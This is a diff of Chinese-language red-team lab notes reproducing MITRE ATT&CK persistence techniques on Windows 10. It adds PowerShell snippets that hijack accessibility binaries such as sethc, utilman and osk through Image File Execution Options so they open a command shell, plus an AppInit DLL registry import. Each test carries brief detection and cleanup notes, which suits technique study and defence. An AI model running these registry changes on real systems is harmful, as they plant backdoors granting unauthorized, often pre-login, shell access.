@@ -57,9 +57,86 @@ windows包含了一些不可见的特性,当使用登陆后使用组合键可以
 - Narrator: C:\Windows\System32\Narrator.exe
 - Display Switcher: C:\Windows\System32\DisplaySwitch.exe
 - App Switcher: C:\Windows\System32\AtBroker.exe
+###### 测试1 Attaches Command Prompt As Debugger To Process - osk
+这个就是调用出软键盘,和运行`osk.exe`一个效果
+```
+$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe"
+$Value = "C:\windows\system32\cmd.exe"
+$Name = "Debugger"
+New-Item -Path $registryPath -Force
+New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+```
+检测就是监控那个svchost进程的process create操作
 
-这个复现没有通过
-##### T1103 - AppInit DLLs
+win10上成功复现
+###### 测试2 Attaches Command Prompt As Debugger To Process - sethc
+这个就是粘滞键(连续按5次shift)
+```
+$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
+$Value = "C:\windows\system32\cmd.exe"
+$Name = "Debugger"
+New-Item -Path $registryPath -Force
+New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+```
+检测就是监控那个svchost进程的process create操作
+
+win10上成功复现
+###### 测试3 Attaches Command Prompt As Debugger To Process - utilman
+这个就是设置那个界面,和运行`utilman.exe`一样
+```
+$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe"
+$Value = "C:\windows\system32\cmd.exe"
+$Name = "Debugger"
+New-Item -Path $registryPath -Force
+New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+```
+检测就是监控那个svchost进程的process create操作
+
+删除
+```
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /f
+```
+win10上成功复现
+###### 测试4 Attaches Command Prompt As Debugger To Process - magnify
+这个就是放大镜,和运行`magnify.exe`一样
+```
+$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe"
+$Value = "C:\windows\system32\cmd.exe"
+$Name = "Debugger"
+New-Item -Path $registryPath -Force
+New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+```
+删除
+```
+reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /f
+```
+检测就是监控那个svchost进程的process create操作
+
+win10上成功复现
+###### 测试6 Attaches Command Prompt As Debugger To Process - DisplaySwitch
+投影
+```
+$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe"
+$Value = "C:\windows\system32\cmd.exe"
+$Name = "Debugger"
+New-Item -Path $registryPath -Force
+New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+```
+检测就是监控那个svchost进程的process create操作
+
+win10上成功复现
+###### 测试7 Attaches Command Prompt As Debugger To Process - AtBroker
+```
+$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe"
+$Value = "C:\windows\system32\calc.exe"
+$Name = "Debugger"
+New-Item -Path $registryPath -Force | Out-Null
+New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+```
+检测就是监控那个svchost进程的process create操作
+
+win10上成功复现
+### T1103 - AppInit DLLs
 AppInit_Dlls键值位于注册表 `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows or HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows`下面，相对于其他的注册表启动项来说，这个键值的特殊之处在于任何使用到User32.dll 的EXE、DLL、OCX等类型的PE文件都会读取这个地方，并且根据约定的规范将这个键值下指向的DLL文件进行加载，加载的方式是调用 LoadLibrary。红队可以使用它加载恶意的dll从而实现persistence和privilege escalation
 
 **AppInit DLL方法在win8和之后的版本已经不能使用了(当secure boot开启的时候)**
@@ -67,6 +144,8 @@ AppInit_Dlls键值位于注册表 `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows
 ```
 reg.exe import T1103.reg
 ```
+检测的话,查看注册表就行
+
 win10上成功复现
 ### T1138 - Application Shimming
 The Microsoft Windows Application Compatibility Infrastructure/Framework(应用兼容基础框架)是用来做操作系统代码向下兼容的,例如它允许开发者修改为windowsxp创建的应用程序以便它在win10上继续使用.shims在操作系统和应用之间充当一个缓冲的角色,当程序运行的时候,shims 缓存决定程序是否需要shim database (.sdb),如果需要,shim将使用Hooking技术(https://attack.mitre.org/techniques/T1179)重定向代码以便与操作系统的通信,shims的默认安装位置如下
